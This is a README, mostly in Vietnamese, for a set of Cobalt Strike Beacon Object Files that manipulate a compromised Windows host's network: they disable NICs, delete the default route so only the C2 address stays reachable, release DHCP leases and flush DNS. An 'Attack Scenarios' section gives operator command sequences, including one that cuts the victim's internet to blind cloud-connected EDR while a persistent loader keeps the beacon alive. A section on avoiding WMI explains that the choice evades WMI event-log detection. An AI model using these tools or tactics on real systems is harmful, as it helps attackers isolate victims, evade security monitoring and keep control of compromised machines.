# BOF Galaxy 2 — Network Control BOFs for Cobalt Strike 4.x

## Overview

Four BOFs (Beacon Object Files) — mỗi kỹ thuật có 2 bản: bản gốc (ASCII) và bản `_w`
(Unicode, dùng `wchar_t` xuyên suốt).

| File | CNA | Bản | Purpose |
|------|-----|-----|---------|
| `disable_nic.x64.obj` | `disable_nic.cna` | gốc | NIC disable/enable, route isolation |
| `disable_nic_w.x64.obj` | `disable_nic_w.cna` | `_w` | NIC disable/enable, route isolation — Unicode |
| `dhcp.x64.obj` | `dhcp.cna` | gốc | DHCP release/renew, `ipconfig /all`, DNS flush |
| `dhcp_w.x64.obj` | `dhcp_w.cna` | `_w` | DHCP release/renew, `ipconfig /all`, DNS flush — Unicode |

**Dùng bản `_w` khi:** adapter name có ký tự non-ASCII (tiếng Việt, Hán, Cyrillic...).
Bản gốc cast `(char)wchar` — sai với non-ASCII. Bản `_w` dùng `WideCharToMultiByte(CP_UTF8)`.

---

## Setup

```
<CS install>\scripts\
    disable_nic.cna
    disable_nic_w.cna
    dhcp.cna
    dhcp_w.cna
    src\
        disable_nic.x64.obj
        disable_nic_w.x64.obj
        dhcp.x64.obj
        dhcp_w.x64.obj
```

Load các `.cna` files trong Cobalt Strike → Script Manager.

---

## Build

```bash
# Bản gốc
x86_64-w64-mingw32-gcc -o disable_nic.x64.obj -c bof_disable_nic.c \
    -masm=intel -Wall -fno-asynchronous-unwind-tables -I.

x86_64-w64-mingw32-gcc -o dhcp.x64.obj -c bof_dhcp.c \
    -masm=intel -Wall -fno-asynchronous-unwind-tables -I.

# Bản _w (wide-char)
x86_64-w64-mingw32-gcc -o disable_nic_w.x64.obj -c bof_disable_nic_w.c \
    -masm=intel -Wall -fno-asynchronous-unwind-tables -I.

x86_64-w64-mingw32-gcc -o dhcp_w.x64.obj -c bof_dhcp_w.c \
    -masm=intel -Wall -fno-asynchronous-unwind-tables -I.
```

Yêu cầu: **MinGW-w64 (ucrt64 hoặc mingw64)**. Không dùng MSVC — MSVC tạo `$SG` COMDAT
symbols và machine type 0x3A43, BOF loader reject.

Verify output là x64 COFF hợp lệ:
```bash
file disable_nic.x64.obj    # → x86-64 COFF object file
file dhcp.x64.obj
file disable_nic_w.x64.obj
file dhcp_w.x64.obj
```

---

## BOF 1: `disable_nic` — NIC control + route isolation

### Commands

Bản gốc (`disable_nic.cna`):

| Command | Action | Windows equivalent |
|---------|--------|--------------------|
| `nic-list <C2_IP>` | Liệt kê adapter + CM device states + route table | `ipconfig`, `route print` |
| `nic-off <C2_IP>` | DHCP release + disable tất cả NIC trừ C2 | `netsh interface set interface disable` |
| `nic-on <C2_IP>` | Re-enable tất cả NIC disabled trừ C2 | `netsh interface set interface enable` |
| `nic-isolate <C2_IP>` | Xóa default gateway, thêm C2/32 host route | `route delete 0.0.0.0` + `route add` |
| `nic-restore <C2_IP>` | Khôi phục default gateway, xóa C2/32 route | `route add 0.0.0.0 mask 0.0.0.0` |

Bản `_w` (`disable_nic_w.cna`) — cùng chức năng, tên alias thêm `-w`:

| Command | Tương đương gốc |
|---------|----------------|
| `nic-list-w <C2_IP>` | `nic-list` |
| `nic-off-w <C2_IP>` | `nic-off` |
| `nic-on-w <C2_IP>` | `nic-on` |
| `nic-isolate-w <C2_IP>` | `nic-isolate` |
| `nic-restore-w <C2_IP>` | `nic-restore` |

`<C2_IP>` là IP của C2 server (địa chỉ beacon đang connect đến). BOF dùng
`GetBestInterface` để tìm adapter đang route đến IP đó và bảo vệ adapter đó khỏi mọi thao tác.

---

### nic-list

```
beacon> nic-list 192.168.1.50

[*] C2: 192.168.1.50 | GUID: {A1B2...} | IfIdx: 7
[*] ===== LIST =====

  IP               OperStatus  GUID                                    FriendlyName
  ---------------  ----------- --------------------------------------  -------------
  192.168.1.100    UP          {A1B2-...}                              Ethernet0 [C2]
  10.0.0.55        UP          {C3D4-...}                              Ethernet1

  CM device states:
  [CM] 11 devices
  [ENABLED ]  {A1B2-...} [C2]
  [ENABLED ]  {C3D4-...}
  [DISABLED]  {E5F6-...}

  IPv4 routes (0.0.0.0/0 and /32):
  0.0.0.0/0   via 192.168.1.1    if=7  metric=25
```

3 lớp thông tin:
1. **IP/OperStatus** — từ `GetAdaptersAddresses` (OS network stack view)
2. **CM device states** — từ `CM_Get_Device_ID_ListW` qua PnP RPC (hardware state thật, hoạt động cả trong Session 0)
3. **Route table** — default routes và /32 host routes

---

### nic-off / nic-on

**nic-off** thực hiện 2 bước cho mỗi non-C2 adapter:
1. `IpReleaseAddress` — gửi DHCP RELEASE đến server, xóa IP khỏi adapter
2. `CM_Disable_DevNode` — disable NIC ở tầng device driver

Adapter biến mất khỏi `ipconfig` và không traffic nào qua được hardware.

**nic-on** gọi `CM_Enable_DevNode` để kích hoạt lại. Windows tự trigger DHCP DISCOVER để lấy IP mới.

**Tại sao cfgmgr32 thay vì SetupAPI?**
`SetupDiGetClassDevsW` trả về 0 device trong beacon context (Session 0, không có window station).
`CM_Get_Device_ID_ListW` dùng PnP RPC bus — không cần window station, tìm thấy mọi device.

**Tại sao skip state UNKNOWN?**
Phantom device (virtual adapter, hardware disconnected) có `CM_PROB_DISABLED` không set nhưng
`DN_STARTED` cũng không set → state = UNKNOWN (-1). Gọi `CM_Disable_DevNode` trên phantom
trả về `CR_INVALID_DEVICE_ID`. BOF skip cleanly.

---

### nic-isolate / nic-restore

Cách khuyến nghị để cắt internet victim mà giữ beacon sống. Chỉ thay đổi routing table, không
động đến hardware.

**nic-isolate:**

```
TRƯỚC:
  Route table:
    0.0.0.0/0  → 192.168.1.1    ← default gateway (mọi traffic đi qua đây)

SAU nic-isolate 192.168.1.50:
  Route table:
    192.168.1.50/32 → 192.168.1.1  ← chỉ C2 IP là routable
    (0.0.0.0/0 đã bị xóa)

Kết quả:
  Beacon → C2 IP → gateway  ✓  (có /32 host route cụ thể)
  Victim → google.com → ??  ✗  (không có default route, Windows drop packet)
```

NIC vẫn `UP`, IP vẫn gán, driver vẫn chạy. Chỉ routing table thay đổi.

**nic-restore** đảo ngược:
1. Đọc gateway từ C2/32 route đã lưu
2. Re-add `0.0.0.0/0` qua gateway đó
3. Xóa C2/32 host route

---

### Khi nào nic-off không hoạt động (single NIC)

```
Ethernet0  ← beacon đi qua đây ← internet victim cũng đi qua đây
```

Disable Ethernet0 → kill beacon → vô dụng.
`nic-off` chỉ hữu ích khi có 2+ NIC — disable các NIC không phải C2.
`nic-isolate` hoạt động với mọi số NIC vì thao tác ở IP routing layer.

---

## BOF 2: `dhcp` — DHCP và ipconfig

### Commands

Bản gốc (`dhcp.cna`):

| Command | Action | Windows equivalent |
|---------|--------|--------------------|
| `dhcp-check <C2_IP>` | Full adapter info (IP, mask, MAC, GW, DHCP, DNS) | `ipconfig /all` |
| `dhcp-off <C2_IP>` | DHCP release tất cả non-C2 adapter | `ipconfig /release` |
| `dhcp-on <C2_IP>` | DHCP renew tất cả non-C2 adapter | `ipconfig /renew` |
| `dhcp-flush <C2_IP>` | Flush local DNS resolver cache | `ipconfig /flushdns` |

Bản `_w` (`dhcp_w.cna`):

| Command | Tương đương gốc |
|---------|----------------|
| `dhcp-check-w <C2_IP>` | `dhcp-check` |
| `dhcp-off-w <C2_IP>` | `dhcp-off` |
| `dhcp-on-w <C2_IP>` | `dhcp-on` |
| `dhcp-flush-w <C2_IP>` | `dhcp-flush` |

---

### dhcp-check (ipconfig /all)

```
beacon> dhcp-check 192.168.1.50

[*] C2: 192.168.1.50 | GUID: {A1B2...}
[*] ===== DHCP-CHECK (ipconfig /all) =====

--- Ethernet0 [C2] ---
  GUID     : {A1B2-C3D4-E5F6-...}
  MAC      : 00-0C-29-AA-BB-CC
  IP       : 192.168.1.100
  Mask     : 255.255.255.0
  Gateway  : 192.168.1.1
  DHCP     : Enabled
  DHCP Srv : 192.168.1.1
  DNS      : 192.168.1.1
             8.8.8.8
  Status   : Up

--- Ethernet1 ---
  GUID     : {C3D4-E5F6-...}
  MAC      : 00-50-56-BB-CC-DD
  IP       : 10.0.0.55
  Mask     : 255.255.0.0
  Gateway  : 10.0.0.1
  DHCP     : Enabled
  DHCP Srv : 10.0.0.1
  DNS      : 10.0.0.1
  Status   : Up
```

Nguồn dữ liệu (cần 2 API vì mỗi cái thiếu thứ kia):
- **IP, mask, gateway, DHCP info**: `GetAdaptersInfo` (API cũ, có `DhcpServer`)
- **MAC, friendly name, DNS**: `GetAdaptersAddresses` (API mới, không có `DhcpServer`)
- Cross-reference qua GUID (`AdapterName`)

---

### dhcp-off (ipconfig /release)

Gửi DHCP RELEASE đến server, xóa IP khỏi adapter. Sau release adapter không có IP
(hoặc tự gán APIPA 169.254.x.x sau ~30 giây nếu không có renew).

Skip: C2 adapter, adapter static IP, adapter không có lease.

**Cảnh báo:** Nếu beacon dùng chung NIC với internet victim, dhcp-off trên NIC đó kill beacon.
Với single-NIC setup: dùng `nic-isolate` thay thế.

---

### dhcp-on (ipconfig /renew)

Trigger DHCP DORA để lấy IP lease mới. Blocking call — chờ handshake xong (1–3 giây
bình thường, tối đa ~30 giây nếu không có DHCP server).

```
DORA:
  Client  ──DISCOVER──►  DHCP server
  Client  ◄──OFFER────   DHCP server   "đây IP 10.0.0.55"
  Client  ──REQUEST───►  DHCP server   "OK tôi lấy"
  Client  ◄──ACK──────   DHCP server   "IP yours for 24h"
```

---

### dhcp-flush (ipconfig /flushdns)

Xóa DNS resolver cache qua `DnsFlushResolverCache` (dnsapi.dll).

**Tại sao quan trọng sau isolation:** Sau `nic-isolate`, victim không ra internet nhưng
có thể vẫn resolve domain từ cache cũ. Flush cache → mọi DNS query sau đó fail ngay.

**Lưu ý:** `dhcp-flush` handle *trước* khi lookup C2 adapter — flush không cần biết
adapter nào, thao tác system-wide. Nếu C2 IP detection fail, flush vẫn chạy được.

---

## API Reference

### bof_disable_nic / bof_disable_nic_w — key APIs

| API | DLL | Mục đích |
|-----|-----|---------|
| `GetBestInterface` | iphlpapi | Tìm NIC đang route đến C2 IP |
| `GetAdaptersAddresses` | iphlpapi | GUID, IP, friendly name, OperStatus |
| `GetInterfaceInfo` | iphlpapi | `IP_ADAPTER_INDEX_MAP` cần cho Release/Renew |
| `IpReleaseAddress` | iphlpapi | Gửi DHCP RELEASE, xóa IP |
| `GetIpForwardTable2` | iphlpapi | Đọc IPv4 routing table |
| `CreateIpForwardEntry2` | iphlpapi | Thêm route entry (cần Protocol=3) |
| `DeleteIpForwardEntry2` | iphlpapi | Xóa route entry |
| `FreeMibTable` | iphlpapi | Free buffer của GetIpForwardTable2 (không dùng HeapFree) |
| `CM_Get_Device_ID_List_SizeW` | cfgmgr32 | Size của NET device list |
| `CM_Get_Device_ID_ListW` | cfgmgr32 | Enumerate PnP network devices (Win7 fallback included) |
| `CM_Locate_DevNodeW` | cfgmgr32 | Mở devnode (với PHANTOM flag để tìm disabled device) |
| `CM_Open_DevNode_Key` | cfgmgr32 | Mở registry key của device |
| `CM_Get_DevNode_Status` | cfgmgr32 | Check ENABLED/DISABLED/UNKNOWN state |
| `CM_Disable_DevNode` | cfgmgr32 | Disable NIC (POLITE + UI_NOT_OK flags) |
| `CM_Enable_DevNode` | cfgmgr32 | Re-enable NIC |
| `RegQueryValueExW` | advapi32 | Đọc `NetCfgInstanceId` (GUID mạng) |
| `WideCharToMultiByte` | kernel32 | (_w only) WCHAR → UTF-8, thay thế cast (char) |
| `MultiByteToWideChar` | kernel32 | (_w only) char GUID → WCHAR cho so sánh |

### bof_dhcp / bof_dhcp_w — key APIs

| API | DLL | Mục đích |
|-----|-----|---------|
| `GetBestInterface` | iphlpapi | Tìm C2 adapter index |
| `GetAdaptersAddresses` | iphlpapi | MAC, friendly name, DNS servers |
| `GetAdaptersInfo` | iphlpapi | IP, mask, gateway, DHCP server IP |
| `GetInterfaceInfo` | iphlpapi | `IP_ADAPTER_INDEX_MAP` cho Release/Renew |
| `IpReleaseAddress` | iphlpapi | DHCP release |
| `IpRenewAddress` | iphlpapi | DHCP renew (blocking) |
| `DnsFlushResolverCache` | dnsapi | Flush DNS resolver cache |
| `WideCharToMultiByte` | kernel32 | (_w only) WCHAR → UTF-8 |
| `MultiByteToWideChar` | kernel32 | (_w only) char → WCHAR |

---

## Attack Scenarios

### Scenario A — Cắt internet, giữ beacon (1 NIC)

```
nic-list 192.168.1.50       # kiểm tra adapter state và routes
nic-isolate 192.168.1.50    # xóa default GW, thêm C2/32 host route
dhcp-flush 192.168.1.50     # xóa DNS cache

# victim: không ra internet, không resolve domain mới
# beacon: sống, có /32 route đến C2

nic-restore 192.168.1.50    # khôi phục khi xong
```

### Scenario B — Cắt internet, giữ beacon (2 NIC)

```
nic-list 192.168.1.50       # xác định NIC nào là C2, NIC nào là internet
nic-off 192.168.1.50        # DHCP release + disable tất cả non-C2 NIC
dhcp-flush 192.168.1.50     # flush DNS cache

# victim: internet NIC bị disable ở hardware level
# beacon: tiếp tục qua C2 NIC

nic-on 192.168.1.50         # re-enable khi xong
```

### Scenario C — Kiểm tra network state

```
dhcp-check 192.168.1.50     # ipconfig /all — full adapter state
nic-list 192.168.1.50       # CM device states + route table
```

### Scenario D — Force thay đổi IP

```
dhcp-off 192.168.1.50       # release DHCP → adapter mất IP
dhcp-on 192.168.1.50        # renew → lease mới (có thể IP khác)
dhcp-check 192.168.1.50     # verify IP mới
```

### Scenario E — EDR cloud disconnect

```
# Mục tiêu: EDR mất cloud telemetry → detection degraded
nic-isolate 192.168.1.50    # cắt internet → EDR không gửi được về cloud
dhcp-flush 192.168.1.50     # flush DNS → EDR không resolve cloud endpoint

# Loader đã persistent → khi victim reboot, beacon tự kết nối lại
# EDR mất cloud context trong thời gian isolation → rule-based detection chỉ
```

---

## Known Limitations

| Limitation | Chi tiết | Workaround |
|-----------|---------|-----------|
| **Privilege** | nic-off/nic-on cần SYSTEM. nic-isolate/dhcp-off cần Admin. | Elevate trước |
| **IpRenewAddress blocks** | Đợi DHCP DORA — tối đa ~30 giây nếu không có server | Không thể async trong BOF |
| **APIPA sau release** | Windows tự gán 169.254.x.x sau ~30s không có DHCP | Bình thường, không phải lỗi |
| **DHCP auto-renew** | DHCP Client service có thể tự renew → khôi phục gateway | Kết hợp nic-off để chắc |
| **IPv6 dual-stack** | nic-isolate chỉ xóa IPv4 default route — victim vẫn có IPv6 internet | Cần xử lý thêm |
| **Route metric** | nic-restore tạo route với metric=1, không restore metric gốc | Không ảnh hưởng function |
| **Reboot persistence** | nic-isolate KHÔNG persist qua reboot (route reset) | Normal — dùng nic-on nếu cần |
| **NIC disable persistence** | nic-off PERSIST qua reboot (device disabled state) | Luôn nic-on trước khi mất access |
| **Single NIC** | dhcp-off/nic-off vô dụng nếu beacon và internet dùng chung NIC | Dùng nic-isolate |
| **VPN** | VPN thêm default route mới sau nic-isolate → bypass | Kill VPN hoặc nic-off VPN adapter |
| **Non-ASCII names (gốc)** | Bản gốc hiển thị sai adapter name Unicode | Dùng bản _w |
| **Windows 7 CM filter** | CM_GETIDLIST_FILTER_CLASS fail trên Win7 | Fallback tự động trong code |

---

## Tại sao không dùng WMI

WMI (Windows Management Instrumentation) là cách phổ biến để control Windows nhưng
không phù hợp với BOF vì 4 lý do:

1. **COM conflict** — WMI cần `CoInitializeEx` + `CoInitializeSecurity`. Trong BOF thread,
   host process đã init COM apartment → gọi lại → undefined behavior/crash.

2. **Event log** — WMI tạo Event ID 5857/5858/5860 (WMI activity log). EDR có rule detect
   WMI abuse ngay. Win32 API trực tiếp không tạo event nào loại này.

3. **Chậm** — WMI mất 100-500ms/operation (COM → WMI service → provider DLL → kernel).
   Win32 API trực tiếp < 5ms.

4. **Không cần thiết** — Mọi thứ WMI làm được, Win32 API làm được trực tiếp hơn, ít layer hơn.

Chi tiết đầy đủ trong `CODE_EXPLAINED.md` phần "Tại sao KHÔNG dùng WMI".
